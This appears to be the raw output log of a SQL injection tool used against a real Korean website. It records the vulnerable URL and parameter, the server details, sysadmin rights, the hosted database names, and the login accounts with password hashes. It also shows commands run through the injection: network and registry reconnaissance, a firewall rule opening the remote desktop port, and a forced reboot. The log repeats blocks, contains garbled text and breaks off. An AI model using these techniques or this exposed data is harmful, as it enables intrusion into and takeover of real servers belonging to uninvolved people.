@@ -1,0 +1,387 @@
+■漏洞信息:============================================================
+ ·URL:http://www.24m.co.kr/membbs/content.asp?w_ID=435
+ ·页面标题：&quot;24M捞荤辑厚胶 - 24M.CO.KR - 捞荤 配呕 辑厚胶&quot;^^
+ ·参数:w_ID=435
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:220.73.136.87
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:06:15 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 9784
+Content-Type: text/html
+Set-Cookie: ref=ref=http%3A%2F%2Fwww%2E24m%2Eco%2Ekr%2Fmembbs%2Fcontent%2Easp%3Fw%5FID%3D435; path=/
+Set-Cookie: ASPSESSIONIDAQSRTSTQ=CBHNECKAHFBKHIBCANINNBAP; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:24m.co.kr
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+007jeju24.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\007jeju24.com.mdf	
+15442426.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\15442426.com.mdf	
+164442443.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\16442443.co.kr.mdf	
+16662453_co_kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\16662453_co_kr.mdf	
+1ton24.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\1ton24.co.kr.mdf	
+21ckgr.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\21ckgr.co.kr.mdf	
+241004.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\241004.co.kr.mdf	
+2424friends.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2424friends.co.kr.mdf	
+2424hankuk.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\2424hankuk.com.mdf	
+2424korea.net	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2424korea.net.mdf	
+2424service.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2424service.co.kr.mdf	
+2433ok.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2433ok.co.kr.mdf	
+2454onuri.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2454onuri.co.kr.mdf	
+2482i.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2482i.co.kr.mdf	
+2495.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2495.co.kr.mdf	
+24bank.net	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24bank.net.mdf	
+24best.net	C:\Program Files\Microsoft SQL Server\MSSQL\data\24best.net.mdf	
+24bk.com	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24bk.com.mdf	
+24changjo.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24changjo.co.kr.mdf	
+24dpt.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\24dpt.com.mdf	
+24dream.com	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24dream.com.mdf	
+24dream_2	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24dream_2.mdf	
+24dream_2008	C:\Program Files\Microsoft SQL Server\MSSQL\data\24dream_2008_Data.MDF	
+24i.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24i.co.kr.mdf	
+24jungbo.net	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24jungbo.net.mdf	
+24korea_2	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24korea_2.mdf	
+24line.net	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24line.net.mdf	
+24line_2	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24line_2.mdf	
+24line_3	C:\Program Files\Microsoft SQL Server\MSSQL\data\24line_3.mdf	
+24m.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24m.co.kr.mdf	
+24madang.com	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24madang.com.mdf	
+24moving.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24moving.co.kr.mdf	
+24plusmove	C:\Program Files\Microsoft SQL Server\MSSQL\data\24plusmove.mdf	
+24shoppingmall_co_kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24shoppingmall_co_kr.mdf	
+24smile.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24smile.co.kr.mdf	
+24top.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24top.co.kr.mdf	
+24town.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\24town.co.kr.mdf	
+24twins.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24twins.co.kr.mdf	
+24ulsan.com	C:\Program Files\Microsoft SQL Server\MSSQL\Data\24ulsan.com.mdf	
+471	C:\Program Files\Microsoft SQL Server\MSSQL\data\471.mdf	
+496	C:\Program Files\Microsoft SQL Server\MSSQL\data\496.mdf	
+522_gagopa	C:\Program Files\Microsoft SQL Server\MSSQL\data\522_gagopa.mdf	
+522_gagopa2	C:\Program Files\Microsoft SQL Server\MSSQL\data\522_gagopa2.mdf	
+544	C:\Program Files\Microsoft SQL Server\MSSQL\data\544.mdf	
+565_aceyd	C:\Program Files\Microsoft SQL Server\MSSQL\data\565_aceyd.mdf	
+622_samsungtrans	C:\Program Files\Microsoft SQL Server\MSSQL\data\622_samsungtrans.mdf	
+629	C:\Program Files\Microsoft SQL Server\MSSQL\data\629.mdf	
+721_daejin	C:\Program Files\Microsoft SQL Server\MSSQL\data\721_daejin.mdf	
+747	C:\Program Files\Microsoft SQL Server\MSSQL\data\747.mdf	
+748	C:\Program Files\Microsoft SQL Server\MSSQL\data\748.mdf	
+749	C:\Program Files\Microsoft SQL Server\MSSQL\data\749.mdf	
+750	C:\Program Files\Microsoft SQL Server\MSSQL\data\750.mdf	
+751	C:\Program Files\Microsoft SQL Server\MSSQL\data\751.mdf	
+752	C:\Program Files\Microsoft SQL Server\MSSQL\data\752.mdf	
+753	C:\Program Files\Microsoft SQL Server\MSSQL\data\753.mdf	
+755_isname2	C:\Program Files\Microsoft SQL Server\MSSQL\data\755_isname2.mdf	
+757_daewoo24	C:\Program Files\Microsoft SQL Server\MSSQL\data\757_daewoo24.mdf	
+758_hotmax	C:\Program Files\Microsoft SQL Server\MSSQL\data\758_hotmax.mdf	
+882424.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\882424.com.mdf	
+aceyd.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\aceyd.co.kr.mdf	
+aircondb	C:\Program Files\Microsoft SQL Server\MSSQL\data\aircondb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbconn_user	A	锂???梄???	11 23 2007 12:55PM	
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	MIRAE-14A	2052	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	MIRAE-14A	2052	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	MIRAE02	5772	AWAITING COMMAND		
+Internet Information Services	sleeping	MIRAE02	5772	AWAITING COMMAND		
+Internet Information Services	sleeping	MIRAE02	5772	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DBSERVER210	SQL Server	SQLOLEDB	DBSERVER210		DBSERVER210	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		10 11 2007  6:34PM	10 11 2007  6:34PM	
+24dream	??横??枖?????咕?碑善明??秾???	158	茄惫绢	07  8 2008  2:14PM	07  8 2008  2:14PM	
+BUILTIN\Administrators		1	茄惫绢	10 11 2007  6:34PM	10 11 2007  6:34PM	
+dbconn_user	?????????????热???????	1	茄惫绢	11 23 2007 12:46PM	05 27 2008  3:33PM	
+ok2424_db	?ㄢ??????ㄏ罻??奡?????????	1	茄惫绢	12 17 2007 11:10AM	04 17 2009 11:10AM	
+ok2424_db2	?????锅?敔搭???皃唁?????挺??	174	茄惫绢	04 17 2009 10:57AM	05 17 2009  1:28AM	
+sa	???缘?聜?吨磽????????????颁	1	茄惫绢	08  6 2000  1:27AM	10 11 2007 10:21PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter 肺拿 康开 楷搬:	
+6		
+7	   Media State . . . . . . . . . . . : Media disconnected	
+8		
+9	Ethernet adapter 肺拿 康开 楷搬 2:	
+10		
+11	   Connection-specific DNS Suffix  . : 	
+12	   IP Address. . . . . . . . . . . . : 220.73.136.88	
+13	   Subnet Mask . . . . . . . . . . . : 255.255.255.128	
+14	   Default Gateway . . . . . . . . . : 220.73.136.1	
+15		
+■REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+1		
+2	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp	
+3	    PortNumber    REG_DWORD    0xd3d	
+4		
+5		
+■netstat -an
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING	
+11	  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING	
+12	  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING	
+13	  TCP    220.73.136.88:139      0.0.0.0:0              LISTENING	
+14	  TCP    220.73.136.88:1433     220.73.136.87:3556     ESTABLISHED	
+15	  TCP    220.73.136.88:1433     220.73.136.87:3649     ESTABLISHED	
+16	  TCP    220.73.136.88:1433     220.73.136.87:3663     ESTABLISHED	
+17	  TCP    220.73.136.88:1433     220.73.136.87:3670     TIME_WAIT	
+18	  TCP    220.73.136.88:1433     220.73.136.87:3681     ESTABLISHED	
+19	  TCP    220.73.136.88:1433     220.73.136.87:3684     ESTABLISHED	
+20	  TCP    220.73.136.88:1433     220.73.136.87:3685     ESTABLISHED	
+21	  TCP    220.73.136.88:1433     220.73.136.87:3686     ESTABLISHED	
+22	  TCP    220.73.136.88:1433     220.73.136.87:3687     ESTABLISHED	
+23	  TCP    220.73.136.88:1433     220.73.136.87:3688     ESTABLISHED	
+24	  TCP    220.73.136.88:1433     220.73.136.87:3689     ESTABLISHED	
+25	  TCP    220.73.136.88:1433     220.73.136.87:3690     ESTABLISHED	
+26	  TCP    220.73.136.88:1433     220.73.136.90:2947     ESTABLISHED	
+27	  TCP    220.73.136.88:1433     220.73.136.90:2968     ESTABLISHED	
+28	  TCP    220.73.136.88:1433     220.73.136.90:2986     ESTABLISHED	
+29	  TCP    220.73.136.88:1433     220.73.136.90:2997     ESTABLISHED	
+30	  TCP    220.73.136.88:1433     220.73.136.90:3165     ESTABLISHED	
+31	  TCP    220.73.136.88:1433     220.73.136.90:3166     ESTABLISHED	
+32	  TCP    220.73.136.88:1433     220.73.136.90:3167     ESTABLISHED	
+33	  TCP    220.73.136.88:1433     220.73.136.90:3171     TIME_WAIT	
+34	  TCP    220.73.136.88:1433     220.73.136.90:3172     TIME_WAIT	
+35	  TCP    220.73.136.88:1433     220.73.136.90:3173     TIME_WAIT	
+36	  TCP    220.73.136.88:1433     220.73.136.90:3185     TIME_WAIT	
+37	  TCP    220.73.136.88:1433     220.73.136.90:3189     TIME_WAIT	
+38	  TCP    220.73.136.88:1433     220.73.136.90:3190     TIME_WAIT	
+39	  TCP    220.73.136.88:1433     220.73.136.90:3205     TIME_WAIT	
+40	  TCP    220.73.136.88:1433     220.73.136.90:3206     TIME_WAIT	
+41	  TCP    220.73.136.88:1433     220.73.136.90:3207     TIME_WAIT	
+42	  TCP    220.73.136.88:1433     220.73.136.90:3222     TIME_WAIT	
+43	  TCP    220.73.136.88:1433     220.73.136.90:3223     TIME_WAIT	
+44	  TCP    220.73.136.88:1433     220.73.136.90:3238     ESTABLISHED	
+45	  TCP    220.73.136.88:1433     220.73.136.90:3240     ESTABLISHED	
+46	  TCP    220.73.136.88:1433     220.73.136.90:3241     TIME_WAIT	
+47	  TCP    220.73.136.88:1433     220.73.136.90:3242     TIME_WAIT	
+48	  UDP    0.0.0.0:445            *:*	
+49	  UDP    0.0.0.0:500            *:*	
+50	  UDP    0.0.0.0:1434           *:*	
+51	  UDP    0.0.0.0:4500           *:*	
+52	  UDP    127.0.0.1:123          *:*	
+53	  UDP    127.0.0.1:1026         *:*	
+54	  UDP    220.73.136.88:123      *:*	
+55	  UDP    220.73.136.88:137      *:*	
+56	  UDP    220.73.136.88:138      *:*	
+57		
+■REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING	
+11	  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING	
+12	  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING	
+13	  TCP    220.73.136.88:139      0.0.0.0:0              LISTENING	
+14	  TCP    220.73.136.88:1433     220.73.136.87:3556     ESTABLISHED	
+15	  TCP    220.73.136.88:1433     220.73.136.87:3649     ESTABLISHED	
+16	  TCP    220.73.136.88:1433     220.73.136.87:3663     ESTABLISHED	
+17	  TCP    220.73.136.88:1433     220.73.136.87:3670     TIME_WAIT	
+18	  TCP    220.73.136.88:1433     220.73.136.87:3681     ESTABLISHED	
+19	  TCP    220.73.136.88:1433     220.73.136.87:3684     ESTABLISHED	
+20	  TCP    220.73.136.88:1433     220.73.136.87:3685     ESTABLISHED	
+21	  TCP    220.73.136.88:1433     220.73.136.87:3686     ESTABLISHED	
+22	  TCP    220.73.136.88:1433     220.73.136.87:3687     ESTABLISHED	
+23	  TCP    220.73.136.88:1433     220.73.136.87:3688     ESTABLISHED	
+24	  TCP    220.73.136.88:1433     220.73.136.87:3689     ESTABLISHED	
+25	  TCP    220.73.136.88:1433     220.73.136.87:3690     ESTABLISHED	
+26	  TCP    220.73.136.88:1433     220.73.136.90:2947     ESTABLISHED	
+27	  TCP    220.73.136.88:1433     220.73.136.90:2968     ESTABLISHED	
+28	  TCP    220.73.136.88:1433     220.73.136.90:2986     ESTABLISHED	
+29	  TCP    220.73.136.88:1433     220.73.136.90:2997     ESTABLISHED	
+30	  TCP    220.73.136.88:1433     220.73.136.90:3165     ESTABLISHED	
+31	  TCP    220.73.136.88:1433     220.73.136.90:3166     ESTABLISHED	
+32	  TCP    220.73.136.88:1433     220.73.136.90:3167     ESTABLISHED	
+33	  TCP    220.73.136.88:1433     220.73.136.90:3171     TIME_WAIT	
+34	  TCP    220.73.136.88:1433     220.73.136.90:3172     TIME_WAIT	
+35	  TCP    220.73.136.88:1433     220.73.136.90:3173     TIME_WAIT	
+36	  TCP    220.73.136.88:1433     220.73.136.90:3185     TIME_WAIT	
+37	  TCP    220.73.136.88:1433     220.73.136.90:3189     TIME_WAIT	
+38	  TCP    220.73.136.88:1433     220.73.136.90:3190     TIME_WAIT	
+39	  TCP    220.73.136.88:1433     220.73.136.90:3205     TIME_WAIT	
+40	  TCP    220.73.136.88:1433     220.73.136.90:3206     TIME_WAIT	
+41	  TCP    220.73.136.88:1433     220.73.136.90:3207     TIME_WAIT	
+42	  TCP    220.73.136.88:1433     220.73.136.90:3222     TIME_WAIT	
+43	  TCP    220.73.136.88:1433     220.73.136.90:3223     TIME_WAIT	
+44	  TCP    220.73.136.88:1433     220.73.136.90:3238     ESTABLISHED	
+45	  TCP    220.73.136.88:1433     220.73.136.90:3240     ESTABLISHED	
+46	  TCP    220.73.136.88:1433     220.73.136.90:3241     TIME_WAIT	
+47	  TCP    220.73.136.88:1433     220.73.136.90:3242     TIME_WAIT	
+48	  UDP    0.0.0.0:445            *:*	
+49	  UDP    0.0.0.0:500            *:*	
+50	  UDP    0.0.0.0:1434           *:*	
+51	  UDP    0.0.0.0:4500           *:*	
+52	  UDP    127.0.0.1:123          *:*	
+53	  UDP    127.0.0.1:1026         *:*	
+54	  UDP    220.73.136.88:123      *:*	
+55	  UDP    220.73.136.88:137      *:*	
+56	  UDP    220.73.136.88:138      *:*	
+57		
+■shutdown -r
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING	
+11	  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING	
+12	  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING	
+13	  TCP    220.73.136.88:139      0.0.0.0:0              LISTENING	
+14	  TCP    220.73.136.88:1433     220.73.136.87:3556     ESTABLISHED	
+15	  TCP    220.73.136.88:1433     220.73.136.87:3649     ESTABLISHED	
+16	  TCP    220.73.136.88:1433     220.73.136.87:3663     ESTABLISHED	
+17	  TCP    220.73.136.88:1433     220.73.136.87:3670     TIME_WAIT	
+18	  TCP    220.73.136.88:1433     220.73.136.87:3681     ESTABLISHED	
+19	  TCP    220.73.136.88:1433     220.73.136.87:3684     ESTABLISHED	
+20	  TCP    220.73.136.88:1433     220.73.136.87:3685     ESTABLISHED	
+21	  TCP    220.73.136.88:1433     220.73.136.87:3686     ESTABLISHED	
+22	  TCP    220.73.136.88:1433     220.73.136.87:3687     ESTABLISHED	
+23	  TCP    220.73.136.88:1433     220.73.136.87:3688     ESTABLISHED	
+24	  TCP    220.73.136.88:1433     220.73.136.87:3689     ESTABLISHED	
+25	  TCP    220.73.136.88:1433     220.73.136.87:3690     ESTABLISHED	
+26	  TCP    220.73.136.88:1433     220.73.136.90:2947     ESTABLISHED	
+27	  TCP    220.73.136.88:1433     220.73.136.90:2968     ESTABLISHED	
+28	  TCP    220.73.136.88:1433     220.73.136.90:2986     ESTABLISHED	
+29	  TCP    220.73.136.88:1433     220.73.136.90:2997     ESTABLISHED	
+30	  TCP    220.73.136.88:1433     220.73.136.90:3165     ESTABLISHED	
+31	  TCP    220.73.136.88:1433     220.73.136.90:3166     ESTABLISHED	
+32	  TCP    220.73.136.88:1433     220.73.136.90:3167     ESTABLISHED	
+33	  TCP    220.73.136.88:1433     220.73.136.90:3171     TIME_WAIT	
+34	  TCP    220.73.136.88:1433     220.73.136.90:3172     TIME_WAIT	
+35	  TCP    220.73.136.88:1433     220.73.136.90:3173     TIME_WAIT	
+36	  TCP    220.73.136.88:1433     220.73.136.90:3185     TIME_WAIT	
+37	  TCP    220.73.136.88:1433     220.73.136.90:3189     TIME_WAIT	
+38	  TCP    220.73.136.88:1433     220.73.136.90:3190     TIME_WAIT	
+39	  TCP    220.73.136.88:1433     220.73.136.90:3205     TIME_WAIT	
+40	  TCP    220.73.136.88:1433     220.73.136.90:3206     TIME_WAIT	
+41	  TCP    220.73.136.88:1433     220.73.136.90:3207     TIME_WAIT	
+42	  TCP    220.73.136.88:1433     220.73.136.90:3222     TIME_WAIT	
+43	  TCP    220.73.136.88:1433     220.73.136.90:3223     TIME_WAIT	
+44	  TCP    220.73.136.88:1433     220.73.136.90:3238     ESTABLISHED	
+45	  TCP    220.73.136.88:1433     220.73.136.90:3240     ESTABLISHED	
+46	  TCP    220.73.136.88:1433     220.73.136.90:3241     TIME_WAIT	
+47	  TCP    220.73.136.88:1433     220.73.136.90:3242     TIME_WAIT	
+48	  UDP    0.0.0.0:445            *:*	
+49	  UDP    0.0.0.0:500            *:*	
+50	  UDP    0.0.0.0:1434           *:*	
+51	  UDP    0.0.0.0:4500           *:*	
+52	  UDP    127.0.0.1:123          *:*	
+53	  UDP    127.0.0.1:1026         *:*	
+54	  UDP    220.73.136.88:123      *:*	
+55	  UDP    220.73.136.88:137      *:*	
+56	  UDP    220.73.136.88:138      *:*	
+57		
+
+■数据库信息:============================================================
+- 数据库名：24m.co.kr
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DBSERVER210
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+007jeju24.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\007jeju24.com.mdf	
+15442426.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\15442426.com.mdf	
+164442443.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\16442443.co.kr.mdf	
+16662453_co_kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\16662453_co_kr.mdf	
+1ton24.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\1ton24.co.kr.mdf	
+21ckgr.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\21ckgr.co.kr.mdf	
+241004.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\241004.co.kr.mdf	
+2424friends.co.kr	C:\Program Files\Microsoft SQL Server\MSSQL\Data\2424friends.co.kr.mdf	
+2424hankuk.com	C:\Program Files\Microsoft SQL Server\MSSQL\data\2424hankuk.com.mdf	
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+Dir of D:: 
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
